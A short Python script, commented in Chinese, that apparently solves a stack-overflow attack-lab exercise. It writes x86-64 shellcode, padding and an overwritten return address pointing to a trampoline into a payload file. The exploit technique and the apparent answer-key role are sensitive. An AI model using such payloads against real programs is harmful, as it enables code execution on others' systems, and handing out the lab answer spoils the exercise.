import struct

# 1. 目标信息
func1_addr = 0x401216      # func1 的起始地址
jmp_xs_addr = 0x401334     # jmp_xs 跳板函数地址

# 2. 构造 Shellcode (x86-64 机器码)
# 作用：将 %edi 设为 0x72 (114)，然后跳转到 func1
shellcode = bytearray()
# mov $0x72, %edi
shellcode += b"\xbf\x72\x00\x00\x00" 
# movabs $0x401216, %rax
shellcode += b"\x48\xb8" + struct.pack("<Q", func1_addr)
# jmp *%rax
shellcode += b"\xff\xe0"

# 3. 计算 Padding 偏移
# 根据反汇编和 GDB：
# 缓冲区从 rbp-0x20 开始，返回地址在 rbp+0x8
# 覆盖返回地址需要填充：0x20 (32字节) + 0x08 (8字节) = 40 字节
# 注意：memcpy 在 func 中拷贝了 0x40 (64字节)，所以我们总共有足够空间。

padding_total = 40
padding = b'A' * (padding_total - len(shellcode))

# 4. 组合最终 Payload
# 布局：[Shellcode] + [Padding] + [返回地址(jmp_xs)]
payload = shellcode + padding + struct.pack("<Q", jmp_xs_addr)

# 5. 输出到文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print(f"Payload 已生成！总长度: {len(payload)} 字节")
print(f"Shellcode 长度: {len(shellcode)} 字节")
print(f"返回地址已覆盖为: {hex(jmp_xs_addr)}")